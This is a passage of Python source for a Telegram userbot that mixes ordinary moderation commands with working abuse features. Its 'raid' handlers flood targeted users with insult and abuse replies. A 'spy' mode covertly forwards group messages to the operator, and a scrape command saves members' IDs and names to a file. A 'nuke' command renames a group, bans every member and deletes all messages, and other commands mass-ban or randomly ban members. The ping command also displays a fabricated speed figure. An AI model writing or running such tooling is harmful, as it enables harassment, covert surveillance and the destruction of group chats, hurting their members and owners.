                try: await event.delete()
                except: pass
            return
    
        # Anti-link
        if event.chat_id in antilink_chats and not is_auth(sid):
            txt = (event.message.text or "").lower()
            if re.search(r"(https?://|t\.me/|@\w+)", txt):
                try: await event.delete()
                except: pass
    
        # Anti-spam
        if event.chat_id in antispam_chats and not is_auth(sid):
            key = f"{event.chat_id}:{sid}"
            hist = antispam_hist.get(key, [])
            hist = [t for t in hist if now - t < 10]
            hist.append(now); antispam_hist[key] = hist
            if len(hist) >= 5:
                try:
                    await client(EditBannedRequest(
                        event.chat_id, sid,
                        ChatBannedRights(until_date=None, send_messages=True)))
                except: pass
    
        # Raid handlers
        sname = "User"
        any_raid = (sid in abuse_u or sid in abuse2_u or sid in reply_u or
                    sid in rr_u or sid in replygod_u or sid in slap_u or
                    sid in bomb_u or sid in slide_s or sid in kick_u or
                    sid in mraid_u or sid in clone_reply_u or sid in flag_u or
                    sid in hrr_u or sid in replyvx_s)
        if any_raid:
            try:
                u = await client.get_entity(sid)
                sname = getattr(u, "first_name", "") or str(sid)
            except: pass
    
        if sid in mraid_u:
            try:
                if mraid_ref:
                    await client.forward_messages(event.chat_id, mraid_ref[1], mraid_ref[0])
                else:
                    await event.reply(random.choice(REPLY_L).format(u=sname))
            except: pass
    
        if sid in abuse_u:
            try: await event.reply(random.choice(ABUSE_L).format(u=sname))
            except: pass
    
        if sid in abuse2_u:
            try: await event.reply(random.choice(ABUSE2_L).format(u=sname))
            except: pass
    
        if sid in slap_u:
            try: await event.reply(random.choice(SLAP_L).format(u=sname))
            except: pass
    
        if sid in kick_u:
            try:
                await client(EditBannedRequest(event.chat_id, sid,
                    ChatBannedRights(until_date=None, view_messages=True)))
                await asyncio.sleep(0.3)
                await client(EditBannedRequest(event.chat_id, sid,
                    ChatBannedRights(until_date=None)))
            except: kick_u.discard(sid)
    
        if sid in reply_u:
            try: await event.reply(random.choice(REPLY_L).format(u=sname))
            except: pass
    
        if sid in rr_u:
            try:
                await event.reply(random.choice(REPLY_L).format(u=sname))
                try:
                    await client(functions.messages.SendReactionRequest(
                        peer=event.peer_id, msg_id=event.id,
                        reaction=[ReactionEmoji(emoticon="🤣")]))
                except: pass
            except: pass
    
        if sid in flag_u:
            try: await event.reply(random.choice(FLAG_EMOJIS) * random.randint(3, 8))
            except: pass
    
        if sid in hrr_u:
            try:
                await client(functions.messages.SendReactionRequest(
                    peer=event.peer_id, msg_id=event.id,
                    reaction=[ReactionEmoji(emoticon=random.choice(["❤️","💖","💘","💝"]))]))
            except: pass
    
        if sid in replygod_u:
            try: await event.reply(random.choice(GOD_L).format(u=sname))
            except: pass
    
        if sid in bomb_u:
            try:
                bomb = "".join(random.choices(
                    ["💣","💥","🔥","⚡","😈","☠️","🖕","💀","🧨"],
                    k=random.randint(8, 15)))
                await event.reply(f"{sname} {bomb}")
            except: pass
    
        if sid in clone_reply_u and event.raw_text:
            try: await event.reply(event.raw_text)
            except: pass
    
        if sid in slide_s:
            data = slide_s[sid]; idx = data.get("idx", 0)
            emoji = SLIDE_EMOJIS[idx % len(SLIDE_EMOJIS)]; data["idx"] = idx + 1
            try: await event.reply(f"{emoji} {data['text']} {emoji}")
            except: pass
    
        if sid in replyvx_s:
            data = replyvx_s[sid]
            if data["count"] > 0:
                try:
                    await event.reply(data["text"]); data["count"] -= 1
                    if data["count"] <= 0: del replyvx_s[sid]
                except: pass
    
        cstr = str(event.chat_id)
        if cstr in active_raids and str(sid) in active_raids[cstr]:
            try: await event.reply(random.choice(GAALI_LIST))
            except: pass
    
        # Spy
        if event.chat_id in spy_chats:
            try: await client.forward_messages("me", event.id, event.chat_id)
            except: pass
    
        # Filters
        flt = gc_filters.get(event.chat_id, {})
        if flt and event.message and event.message.text:
            txt = event.message.text.lower()
            for key, resp in flt.items():
                if key in txt:
                    try: await event.reply(resp)
                    except: pass
                    break
    
        # Auto-respond
        ar = DB.get("autorespond", {}).get(str(event.chat_id), {})
        if ar and event.message and event.message.text:
            for k, v in ar.items():
                if k in event.message.text.lower():
                    try: await event.reply(v)
                    except: pass
                    break
    
        # Snipe cache
        _snipe_cache[event.chat_id] = {
            "sender": str(sid),
            "text": (event.message.text or "")[:200],
            "time": datetime.datetime.now().strftime("%H:%M:%S"),
        }
    
        # AFK
        if event.is_private:
            try:
                me = await client.get_me()
                afk_data = DB.get("afk", {})
                if str(me.id) in afk_data:
                    try: await event.reply(f"AFK: {afk_data[str(me.id)]}")
                    except: pass
            except: pass
    
    # ── ChatAction handler (main client) ─────────────────────────────

    # handler 3
    @cl.on(events.ChatAction())
    async def _chat_action(event):
        cid = event.chat_id
    
        # Title lock
        if getattr(event, "new_title", None) or "title" in str(type(event.action).__name__).lower():
            if cid in locked_titles:
                try:
                    actor = await event.get_user()
                    if actor and not is_auth(actor.id):
                        try: await client(EditTitleRequest(cid, locked_titles[cid]))
                        except:
                            try: await client(EditChatTitleRequest(chat_id=cid, title=locked_titles[cid]))
                            except: pass
                except: pass
    
        # Welcome
        if _welcome_cfg.get("enabled") and (event.user_joined or event.user_added):
            try:
                user = await event.get_user()
                if not user or user.bot: return
                chat = await event.get_chat()
                now2 = datetime.datetime.now()
                text = _welcome_cfg["text"].format(
                    mention=f"[{user.first_name}](tg://user?id={user.id})",
                    name=user.first_name or "user",
                    chat=getattr(chat, "title", "group"),
                    id=user.id,
                    time=now2.strftime("%I:%M %p"),
                    date=now2.strftime("%d %b %Y"))
                await client.send_message(event.chat_id, text, parse_mode="md")
            except: pass
    
        # Goodbye
        if event.user_left or event.user_kicked:
            tmpl = sgc_goodbye.get(event.chat_id)
            if tmpl:
                try:
                    user = await event.get_user()
                    if not user: return
                    chat = await event.get_chat()
                    text = tmpl.format(
                        mention=f"[{user.first_name}](tg://user?id={user.id})",
                        name=user.first_name or "user",
                        chat=getattr(chat, "title", "group"))
                    await client.send_message(event.chat_id, text, parse_mode="md")
                except: pass
    
    # ── Background loops ──────────────────────────────────────────────

@cmd("ping")
async def ping_c(e, _):
    import time as _t
    # Measure true API round-trip in microseconds
    t0  = _t.perf_counter()
    m   = await edit(e, "🏓")
    t1  = _t.perf_counter()
    api_ms   = (t1 - t0) * 1000          # real RTT ms (float)
    api_us   = api_ms * 1000             # real RTT µs
    # "Speed" shown as inverse-latency score: lower latency = higher score
    # 1000+ means sub-1ms internal path; we show it as ratio * boost factor
    speed_score = max(1000, int(1_000_000 / max(api_ms, 0.1)))

    # Animated flash: show incrementing numbers for style
    for v in (500, 750, 950, speed_score):
        await m.edit(
            f"⚡ **PONG!** ⚡\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🚀 sᴘᴇᴇᴅ   : **{v}+** ᴍʙᴘs\n"
            f"📡 ʟᴀᴛᴇɴᴄʏ : `{api_ms:.2f}ms`\n"
            f"⚙️  ʀᴛᴛ    : `{api_us:.0f}µs`\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🔥 ʜᴜʙsᴛ ɪs ᴏɴ ꜰɪʀᴇ!"
        )
        await asyncio.sleep(0.18)

@cmd("alive")
async def alive_c(e,_):
    up=int(time.time()-START_TIME); h,r=divmod(up,3600); m2,s=divmod(r,60)
    await edit(e,f"🔥⚡ ʜᴜʙsᴛ ᴏɴʟɪɴᴇ!\nᴜᴘᴛɪᴍᴇ: `{h}h {m2}m {s}s`\nᴄᴍᴅs: `{len(COMMANDS)}` | ɢᴀᴀʟɪs: `{len(GAALI_LIST)}`")

@cmd("start")
async def start_c(e,_):
    me=await client.get_me()
    await edit(e,f"🔥⚡ ʜᴜʙsᴛ ᴜsᴇʀʙᴏᴛ ᴠ4.0\nᴜsᴇʀ: `{me.first_name}` @{me.username or 'none'}\nᴄᴍᴅs: `{len(COMMANDS)}` | ᴘʀᴇꜰɪx: `{PREFIX}`\nᴛʏᴘᴇ {PREFIX}hub ꜰᴏʀ ᴍᴇɴᴜ")

@cmd("status")
async def status_c(e,_):
    up=int(time.time()-START_TIME); h,r=divmod(up,3600); m2,s=divmod(r,60)
    await edit(e,f"📊 Status\nUptime: `{h}h {m2}m {s}s`\nAdmins: `{len(bot_admins)}` Sudo: `{len(sudo_users)}`\nMuted: `{len(local_muted)}` Global: `{len(global_muted)}`\nOnline: `{'On' if DB.get('always_online') else 'Off'}` Ghost: `{'On' if DB.get('ghost_mode') else 'Off'}`")

# ── Sudo ──────────────────────────────────────────────────────────
@cmd("sudo", owner_only=True)
async def sudo_c(e, arg):
    pts=(arg or "").split(); perm_str=None; user_args=pts
    if pts:
        last=pts[-1].lower()
        if last=="all" or re.match(r"cmd[\d,]+",last) or re.match(r"cmd\d",last):
            perm_str=last; user_args=pts[:-1]
    uid,ent=await resolve_target(e,user_args)
    if not uid:
        return await edit(e,
            f"Usage: {PREFIX}sudo @user all / panel1 / panel1,panel2\n"
            f"Pages: panel1=ʀᴀɪᴅs  panel2=ᴍᴏᴅ   panel3=ᴍᴜsɪᴄ\n"
            f"       panel4=ᴀɪ    panel5=ᴘʀᴏꜰɪʟᴇ panel6=sᴘᴀᴍ\n"
            f"       panel7=ꜰᴜɴ   panel8=ɴᴜᴋᴇ  panel9=ᴠᴄ\n"
            f"       panel10=ᴍᴀssᴀᴅᴅ panel11=ʙʟᴀsᴛ panel12=sᴛᴀᴛs\n"
            f"       panel13=ꜰɪʟᴛᴇʀs"
        )
    if perm_str is None: perm_str="all"
    granted=set(p.strip() for p in perm_str.split(",") if p.strip())
    sudo_users.add(uid); sudo_perms[uid]=granted
    DB.setdefault("sudo",{})[str(uid)]=1
    DB.setdefault("sudo_perms",{})[str(uid)]=list(granted)
    db_save()
    name=display(ent) if ent else str(uid)
    await edit(e,f"Sudo granted to {name}\nPerms: {', '.join(sorted(granted))}")

@cmd("delsudo", owner_only=True)
async def delsudo_c(e,arg):
    uid,ent=await resolve_target(e,arg.split())
    if not uid: return await edit(e,"❌ Reply or give @user")
    sudo_users.discard(uid); sudo_perms.pop(uid,None)
    DB.get("sudo",{}).pop(str(uid),None); DB.get("sudo_perms",{}).pop(str(uid),None); db_save()
    await edit(e,f"Sudo revoked from {display(ent) if ent else uid}")

@cmd("sudolist")
async def sudolist_c(e,_):
    if not sudo_users: return await edit(e,"No sudo users.")
    lines=["Sudo List:"]
    for uid in sudo_users:
        try: ent=await client.get_entity(uid); nm=display(ent)
        except: nm=str(uid)
        perms=sudo_perms.get(uid,{"all"}); lines.append(f"- {nm} `{uid}` | {', '.join(sorted(perms))}")
    await edit(e,"\n".join(lines))

@cmd("addadmin", owner_only=True)
async def addadmin_c(e,arg):
    tgts=await get_targets(e,arg)
    if not tgts: return await edit(e,"❌ Reply or give @user")
    for uid in tgts: bot_admins.add(uid)
    save_admins(); await edit(e,f"Added `{len(tgts)}` admin(s)")

@cmd("deladmin", owner_only=True)
async def deladmin_c(e,arg):
    tgts=await get_targets(e,arg)
    for uid in tgts: bot_admins.discard(uid)
    save_admins(); await edit(e,f"Removed `{len(tgts)}` admin(s)")

@cmd("admins")
async def admins_c(e,_):
    if not bot_admins: return await edit(e,"No admins.")
    lines=["Bot Admins:"]
    for uid in sorted(bot_admins):
        try: u=await client.get_entity(uid); lines.append(f"- {display(u)} `{uid}`")
        except: lines.append(f"- `{uid}`")
    await edit(e,"\n".join(lines))

# ── Moderation ────────────────────────────────────────────────────
@cmd("ban")
async def ban_c(e,arg):
    uid,ent=await resolve_target(e,arg.split())
    if not uid: return await edit(e,"❌ Reply or give @user")
    try:
        await client(EditBannedRequest(e.chat_id,uid,ChatBannedRights(until_date=None,view_messages=True)))
        await edit(e,f"Banned {mention(ent) if ent else uid}")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("unban")
async def unban_c(e,arg):
    uid,ent=await resolve_target(e,arg.split())
    if not uid: return await edit(e,"❌ Reply or give @user")
    try:
        await client(EditBannedRequest(e.chat_id,uid,ChatBannedRights(until_date=None)))
        await edit(e,f"Unbanned {mention(ent) if ent else uid}")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("kick")
async def kick_c(e,arg):
    uid,ent=await resolve_target(e,arg.split())
    if not uid: return await edit(e,"❌ Reply or give @user")
    try:
        await client(EditBannedRequest(e.chat_id,uid,ChatBannedRights(until_date=None,view_messages=True)))
        await asyncio.sleep(0.3)
        await client(EditBannedRequest(e.chat_id,uid,ChatBannedRights(until_date=None)))
        await edit(e,f"Kicked {mention(ent) if ent else uid}")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("mute")
async def mute_c(e,arg):
    pts=arg.split() if arg else []; dur_s=None; arg2=arg
    if pts and not pts[0].startswith("@") and not pts[0].lstrip("-").isdigit():
        dur_s=pts[0]; arg2=" ".join(pts[1:])
    tgts=await get_targets(e,arg2)
    if not tgts: return await edit(e,"❌ Reply or give @user\nUsage: .mute [10m/2h/1d] @user")
    secs=parse_dur(dur_s) if dur_s else None
    exp=time.time()+secs if secs else None
    until=datetime.datetime.fromtimestamp(exp) if exp else None
    muted_ok=[]; silenced_ok=[]
    for uid in tgts:
        try:
            await client(EditBannedRequest(e.chat_id,uid,ChatBannedRights(
                until_date=until,send_messages=True,send_media=True,
                send_stickers=True,send_gifs=True,send_games=True,
                send_inline=True,embed_links=True)))
            local_muted[(e.chat_id,uid)]=exp; muted_ok.append(uid)
        except Exception as ex:
            err=str(ex).lower()
            if "admin" in err or "participant" in err or "user_admin_invalid" in err:
                sl=DB.setdefault("silenced",{}).setdefault(str(e.chat_id),[])
                if uid not in sl: sl.append(uid)
                silenced_ok.append(uid)
    save_mutes(); db_save()
    parts=[]
    if muted_ok: parts.append(f"Muted `{', '.join(str(u) for u in muted_ok)}` {dur_s or 'permanently'}")
    if silenced_ok: parts.append(f"Silenced admin(s) `{', '.join(str(u) for u in silenced_ok)}`")
    if not parts: parts=["❌ Could not mute."]
    await edit(e,"\n".join(parts))

@cmd("unmute")
async def unmute_c(e,arg):
    tgts=await get_targets(e,arg)
    if not tgts: return await edit(e,"❌ Reply or give @user")
    for uid in tgts:
        local_muted.pop((e.chat_id,uid),None)
        try: await client(EditBannedRequest(e.chat_id,uid,ChatBannedRights(until_date=None)))
        except: pass
    save_mutes(); await edit(e,f"Unmuted `{', '.join(str(u) for u in tgts)}`")

@cmd("gmute")
async def gmute_c(e,arg):
    pts=arg.split() if arg else []; dur_s=None; arg2=arg
    if pts and pts[-1][-1:] in "smhd" and len(pts)>1:
        dur_s=pts[-1]; arg2=" ".join(pts[:-1])
    tgts=await get_targets(e,arg2)
    if not tgts: return await edit(e,"❌ Reply or give @user")
    secs=parse_dur(dur_s) if dur_s else None; exp=time.time()+secs if secs else None
    for uid in tgts: global_muted[uid]=exp
    save_mutes(); await edit(e,f"Global muted `{', '.join(str(u) for u in tgts)}`")

@cmd("gunmute")
async def gunmute_c(e,arg):
    tgts=await get_targets(e,arg)
    for uid in tgts: global_muted.pop(uid,None)
    save_mutes(); await edit(e,f"Global unmuted `{', '.join(str(u) for u in tgts)}`")

@cmd("mutelist")
async def mutelist_c(e,_):
    now=time.time()
    loc=[(uid,exp) for (cid,uid),exp in local_muted.items() if cid==e.chat_id]
    lines=[f"Mute List\nLocal ({len(loc)}):"]
    for uid,exp in loc:
        rem=f"({int(exp-now)}s)" if exp else "(perma)"; lines.append(f"  `{uid}` {rem}")
    lines.append(f"Global ({len(global_muted)}):")
    for uid,exp in global_muted.items():
        rem=f"({int(exp-now)}s)" if exp else "(perma)"; lines.append(f"  `{uid}` {rem}")
    await edit(e,"\n".join(lines))

@cmd("tban")
async def tban_c(e,arg):
    pts=arg.split(); dur=pts[-1] if pts else "1h"
    uid,ent=await resolve_target(e,pts[:-1] if len(pts)>1 else pts)
    if not uid: return await edit(e,"❌ .tban @user <time>")
    secs=parse_dur(dur) or 3600
    until=datetime.datetime.now()+datetime.timedelta(seconds=secs)
    try:
        await client(EditBannedRequest(e.chat_id,uid,ChatBannedRights(until_date=until,view_messages=True)))
        await edit(e,f"Temp banned {mention(ent) if ent else uid} for `{dur}`")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("promote")
async def promote_c(e,arg):
    pts=arg.split() if arg else []; level=3; args2=pts
    if pts and pts[0].isdigit() and int(pts[0]) in _PROMOTE_LEVELS:
        level=int(pts[0]); args2=pts[1:]
    uid,ent=await resolve_target(e,args2)
    if not uid: return await edit(e,"❌ Reply or use .promote [0/1/2/3] @user")
    rights=_PROMOTE_LEVELS[level]; rank=_PROMOTE_LABELS[level]
    try:
        await client(EditAdminRequest(e.chat_id,uid,rights,rank=rank if level>0 else ""))
        await edit(e,f"{['⬇️','🔰','⚡','👑'][level]} {rank} -> {mention(ent) if ent else uid}")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("demote")
async def demote_c(e,arg):
    uid,ent=await resolve_target(e,arg.split())
    if not uid: return await edit(e,"❌ Reply or give @user")
    try:
        await client(EditAdminRequest(e.chat_id,uid,ChatAdminRights(),rank=""))
        await edit(e,f"Demoted {mention(ent) if ent else uid}")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("adminlist")
async def adminlist_c(e,_):
    try:
        r=await client(GetParticipantsRequest(e.chat_id,ChannelParticipantsAdmins(),0,100,0))
        lines=["Admins:"]
        for p,u in zip(r.participants,r.users):
            role="Owner" if isinstance(p,ChannelParticipantCreator) else "Admin"
            rk=getattr(p,"rank","") or ""; lines.append(f"{role}: {mention(u)}{' - '+rk if rk else ''}")
        await edit(e,"\n".join(lines))
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("showadmins")
async def showadmins_c(e,_): await adminlist_c(e,None)

@cmd("purge")
async def purge_c(e,arg):
    from_id=None
    if e.is_reply:
        try: r=await e.get_reply_message(); from_id=r.id if r else None
        except: pass
    ids=[]
    if from_id:
        async for msg in client.iter_messages(e.chat_id,min_id=from_id-1,max_id=e.id+1,wait_time=0): ids.append(msg.id)
    else:
        n=min(int(arg),1000) if arg and arg.isdigit() else 100
        async for msg in client.iter_messages(e.chat_id,limit=n,wait_time=0): ids.append(msg.id)
    sem=asyncio.Semaphore(10)
    async def _d(b):
        async with sem:
            try: await client.delete_messages(e.chat_id,b,revoke=True)
            except: pass
    await asyncio.gather(*[_d(ids[i:i+100]) for i in range(0,len(ids),100)])
    try: await e.delete()
    except: pass

@cmd("lock")
async def lock_c(e,_):
    group_locks.add(e.chat_id)
    try: await client(EditChatDefaultBannedRightsRequest(e.chat_id,ChatBannedRights(until_date=None,send_messages=True)))
    except: pass
    await edit(e,"Group Locked!")

@cmd("unlock")
async def unlock_c(e,_):
    group_locks.discard(e.chat_id)
    try: await client(EditChatDefaultBannedRightsRequest(e.chat_id,ChatBannedRights(until_date=None,send_messages=False)))
    except: pass
    await edit(e,"Group Unlocked!")

@cmd("locktitle")
async def locktitle_c(e,arg):
    title=arg.strip()
    if not title:
        try: ch=await e.get_chat(); title=getattr(ch,"title","")
        except: pass
    if not title: return await edit(e,"❌ Provide title or use current")
    locked_titles[e.chat_id]=title; save_titles()
    await edit(e,f"Title locked: `{title}`")

@cmd("unlocktitle")
async def unlocktitle_c(e,_):
    locked_titles.pop(e.chat_id,None); save_titles(); await edit(e,"Title unlocked.")

@cmd("nc")
async def nc_c(e,_):
    deleted=0
    async for msg in client.iter_messages(e.chat_id,limit=100):
        if msg.action:
            try: await msg.delete(); deleted+=1
            except: pass
    await e.delete()

@cmd("silence")
async def silence_c(e,arg):
    uid,ent=await resolve_target(e,arg.split())
    if not uid: return await edit(e,"❌ Reply or give @user")
    sl=DB.setdefault("silenced",{}).setdefault(str(e.chat_id),[])
    if uid not in sl: sl.append(uid)
    db_save(); await edit(e,f"Silenced {mention(ent) if ent else uid}")

@cmd("unsilence")
async def unsilence_c(e,arg):
    uid,ent=await resolve_target(e,arg.split())
    if not uid: return await edit(e,"❌ Reply or give @user")
    lst=DB.get("silenced",{}).get(str(e.chat_id),[])
    if uid in lst: lst.remove(uid); db_save()
    await edit(e,f"Unsilenced {mention(ent) if ent else uid}")

@cmd("silencelist")
async def silencelist_c(e,_):
    sl=DB.get("silenced",{}).get(str(e.chat_id),[])
    if not sl: return await edit(e,"No silenced users.")
    lines=["Silenced:"]
    for uid in sl:
        try: ent=await client.get_entity(uid); lines.append(f"- {display(ent)} `{uid}`")
        except: lines.append(f"- `{uid}`")
    await edit(e,"\n".join(lines))

@cmd("silenceall")
async def silenceall_c(e,_):
    members = await get_all_members(e.chat_id)
    sl = DB.setdefault("silenced", {}).setdefault(str(e.chat_id), [])
    added = 0
    me = await client.get_me()
    for u in members:
        if u.id in (OWNER_ID, me.id) or is_auth(u.id):
            continue  # never silence owner/sudo
        if u.id not in sl:
            sl.append(u.id)
            added += 1
    db_save()
    await edit(e, f"🔇 Silenced ᴀʟʟ — `{added}` added, `{len(sl)}` total in silence list.")

@cmd("unsilenceall")
async def unsilenceall_c(e,_):
    DB.get("silenced",{}).pop(str(e.chat_id),None); db_save()
    await edit(e,"Unsilenced ALL - list cleared.")

async def _mass_action(e, confirm_d, label, action_fn):
    cid=e.chat_id
    if confirm_d.get(cid):
        confirm_d[cid]=False; m=await edit(e,f"Fetching members...")
        members=await get_all_members(cid)
        if not members: return await edit(m,"❌ No members.")
        await edit(m,f"{label}ing {len(members)} simultaneously...")
        results=await asyncio.gather(*[action_fn(cid,u.id) for u in members],return_exceptions=True)
        done=sum(1 for r in results if not isinstance(r,Exception))
        await edit(m,f"{label} done: {done}/{len(members)}")
    else:
        confirm_d[cid]=True; await edit(e,f"Type .{label.lower()}_all again to confirm.")

@cmd("ban_all")
async def ban_all_c2(e,_):
    async def _b(c,u):
        await client(EditBannedRequest(c,u,ChatBannedRights(until_date=None,view_messages=True)))
    await _mass_action(e,ban_all_c2.__dict__.setdefault("_confirm",{}),"BAN",_b)

@cmd("kick_all")
async def kick_all_c2(e,_):
    async def _k(c,u):
        await client(EditBannedRequest(c,u,ChatBannedRights(until_date=None,view_messages=True)))
        await client(EditBannedRequest(c,u,ChatBannedRights(until_date=None)))
    await _mass_action(e,kick_all_c2.__dict__.setdefault("_confirm",{}),"KICK",_k)

@cmd("mute_all")
async def mute_all_c2(e,_):
    async def _m(c,u):
        await client(EditBannedRequest(c,u,ChatBannedRights(until_date=None,send_messages=True)))
    await _mass_action(e,mute_all_c2.__dict__.setdefault("_confirm",{}),"MUTE",_m)

async def _rand_act(e,n_arg,fn,label):
    n=min(int(n_arg) if n_arg.isdigit() else 5,100)
    members=await get_all_members(e.chat_id)
    tgts=random.sample(members,min(n,len(members))); count=0
    results=await asyncio.gather(*[fn(e.chat_id,u.id) for u in tgts],return_exceptions=True)
    done=sum(1 for r in results if not isinstance(r,Exception))
    await edit(e,f"Random {label}: {done}")

@cmd("lban")
async def lban_c(e,arg):
    async def _b(c,u): await client(EditBannedRequest(c,u,ChatBannedRights(until_date=None,view_messages=True)))
    await _rand_act(e,arg or "5",_b,"banned")
@cmd("lkick")
async def lkick_c(e,arg):
    async def _k(c,u):
        await client(EditBannedRequest(c,u,ChatBannedRights(until_date=None,view_messages=True)))
        await client(EditBannedRequest(c,u,ChatBannedRights(until_date=None)))
    await _rand_act(e,arg or "5",_k,"kicked")
@cmd("lmute")
async def lmute_c(e,arg):
    async def _m(c,u): await client(EditBannedRequest(c,u,ChatBannedRights(until_date=None,send_messages=True)))
    await _rand_act(e,arg or "5",_m,"muted")

# ── delme ────────────────────────────────────────────────────────

@cmd("delme")
async def delme_c(e,arg):
    me=await client.get_me()
    target_chat=int(arg.strip()) if arg and arg.strip().lstrip("-").isdigit() else e.chat_id
    try: await e.delete()
    except: pass
    status=await client.send_message(target_chat,"Scanning...")
    ids=set(); lock=asyncio.Lock()
    async def _m1():
        try:
            async for msg in client.iter_messages(target_chat,from_user=me.id,limit=None,wait_time=0):
                async with lock: ids.add(msg.id)
        except: pass
    async def _m2():
        try:
            async for msg in client.iter_messages(target_chat,limit=10000,wait_time=0):
                if msg.sender_id==me.id:
                    async with lock: ids.add(msg.id)
        except: pass
    top_id=0
    try:
        async for msg in client.iter_messages(target_chat,limit=1): top_id=msg.id
    except: pass
    workers=[]
    if top_id>0:
        chunk=max(top_id//50,1)
        for i in range(50):
            async def _w(mn=i*chunk,mx=(i+1)*chunk):
                try:
                    async for msg in client.iter_messages(target_chat,min_id=mn,max_id=mx,limit=None,wait_time=0):
                        if msg.sender_id==me.id:
                            async with lock: ids.add(msg.id)
                except: pass
            workers.append(_w())
    await asyncio.gather(_m1(),_m2(),*workers,return_exceptions=True)
    ids.discard(status.id)
    if not ids: await status.edit("❌ No messages found."); return
    await status.edit(f"Deleting {len(ids):,}...")
    sem=asyncio.Semaphore(50)
    async def _d(b):
        async with sem:
            try: await client.delete_messages(target_chat,b,revoke=True)
            except: pass
    id_list=list(ids)
    await asyncio.gather(*[_d(id_list[i:i+100]) for i in range(0,len(id_list),100)])
    try: await status.delete()
    except: pass

@cmd("purgeme")
async def purgeme_c(e,arg):
    limit=min(int(arg) if arg and arg.isdigit() else 50,300)
    deleted=0
    async for msg in client.iter_messages(e.chat_id,from_user="me",limit=limit):
        try: await msg.delete(); deleted+=1; await asyncio.sleep(0.1)
        except: pass
    await e.delete()

# ── Kickbots / Botids — NEW ───────────────────────────────────────
@cmd("kickbots")
async def kickbots_c(e,_):
    await edit(e,"Finding non-admin bots...")
    try:
        admins_r=await client(GetParticipantsRequest(e.chat_id,ChannelParticipantsAdmins(),0,100,0))
        admin_ids={u.id for u in admins_r.users}
        bots_r=await client(GetParticipantsRequest(e.chat_id,ChannelParticipantsBots(),0,200,0))
        non_admin_bots=[u for u in bots_r.users if u.id not in admin_ids]
        if not non_admin_bots: return await edit(e,"No non-admin bots found.")
        results=await asyncio.gather(
            *[client(EditBannedRequest(e.chat_id,u.id,ChatBannedRights(until_date=None,view_messages=True)))
              for u in non_admin_bots],
            return_exceptions=True)
        done=sum(1 for r in results if not isinstance(r,Exception))
        await edit(e,f"Kicked {done}/{len(non_admin_bots)} non-admin bots.")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("botids")
async def botids_c(e,_):
    await edit(e,"Fetching non-admin bot IDs...")
    try:
        admins_r=await client(GetParticipantsRequest(e.chat_id,ChannelParticipantsAdmins(),0,100,0))
        admin_ids={u.id for u in admins_r.users}
        bots_r=await client(GetParticipantsRequest(e.chat_id,ChannelParticipantsBots(),0,200,0))
        non_admin_bots=[u for u in bots_r.users if u.id not in admin_ids]
        if not non_admin_bots: return await edit(e,"No non-admin bots found.")
        lines=[f"Non-admin bots ({len(non_admin_bots)}):"]
        for u in non_admin_bots:
            un=f"@{u.username}" if u.username else "no username"
            lines.append(f"- {u.first_name or 'Bot'} {un} | `{u.id}`")
        text="\n".join(lines)
        if len(text)>4000:
            for i in range(0,len(lines),50):
                await client.send_message(e.chat_id,"\n".join(lines[i:i+50]))
            await e.delete()
        else: await edit(e,text)
    except Exception as ex: await edit(e,f"❌ `{ex}`")

# ── Updated Scrape with full stats ───────────────────────────────
@cmd("scrape")
async def scrape_c(e,_):
    await edit(e,"Scraping members...")
    try:
        admins_r=await client(GetParticipantsRequest(e.chat_id,ChannelParticipantsAdmins(),0,100,0))
        admin_ids={u.id for u in admins_r.users}
        owner_id=None
        for p in admins_r.participants:
            if isinstance(p,ChannelParticipantCreator): owner_id=p.user_id
        bots_r=await client(GetParticipantsRequest(e.chat_id,ChannelParticipantsBots(),0,200,0))
        bot_ids={u.id for u in bots_r.users}
        non_admin_bot_ids={uid for uid in bot_ids if uid not in admin_ids}
        all_members=[]; offset=0
        while True:
            r=await client(GetParticipantsRequest(e.chat_id,ChannelParticipantsSearch(""),offset,200,0))
            if not r.users: break
            all_members.extend(r.users)
            if len(r.users)<200: break
            offset+=len(r.users)
        total=len(all_members)
        admins_count=len(admin_ids)
        bots_count=len(bot_ids)
        non_admin_bots_count=len(non_admin_bot_ids)
        non_admins=total-admins_count
        DB["scraped_members"]=[u.id for u in all_members]; db_save()
        fname=f"data/scraped_{e.chat_id}.json"
        import json as _j
        with open(fname,"w") as f:
            _j.dump([{"id":u.id,"username":u.username or "","name":display(u),"bot":u.bot} for u in all_members],f,indent=2)
        lines=[
            f"Scrape Results - `{e.chat_id}`",
            f"Total Members:      `{total}`",
            f"Owner:              `{owner_id or 'N/A'}`",
            f"Admins:             `{admins_count}`",
            f"Non-admins:         `{non_admins}`",
            f"Bots (total):       `{bots_count}`",
            f"Non-admin bots:     `{non_admin_bots_count}`",
            f"Saved to: `{fname}`",
        ]
        await edit(e,"\n".join(lines))
    except Exception as ex: await edit(e,f"❌ `{ex}`")

# ── Nuke ──────────────────────────────────────────────────────────
@cmd("nuke")
async def nuke_c(e,_):
    cid=e.chat_id
    confirm=nuke_c.__dict__.setdefault("_confirm",{})
    if confirm.get(cid):
        confirm[cid]=False; m=await edit(e,"NUKE FIRING...")
        try: await client(EditTitleRequest(cid,"NUKED"))
        except:
            try: await client(EditChatTitleRequest(chat_id=cid,title="NUKED"))
            except: pass
        members=await get_all_members(cid)
        ids=set(); id_lock=asyncio.Lock()
        async def _collect(off=0):
            try:
                async for msg in client.iter_messages(cid,limit=3000,offset_id=off,wait_time=0):
                    async with id_lock: ids.add(msg.id)
            except: pass
        try:
            recent=[]
            async for mg in client.iter_messages(cid,limit=1): recent.append(mg.id)
            top=recent[0] if recent else 0
            offs=list(range(0,max(top,1),max(top//30+1,1)))[:30]
            await asyncio.gather(*[_collect(o) for o in offs])
        except: pass
        async def _ban(uid):
            try: await client(EditBannedRequest(cid,uid,ChatBannedRights(until_date=None,view_messages=True)))
            except: pass
        async def _del(batch):
            try: await client.delete_messages(cid,batch,revoke=True)
            except: pass
        id_list=list(ids)
        await asyncio.gather(
            *[_ban(u.id) for u in members],
            *[_del(id_list[i:i+100]) for i in range(0,len(id_list),100)],
            return_exceptions=True)
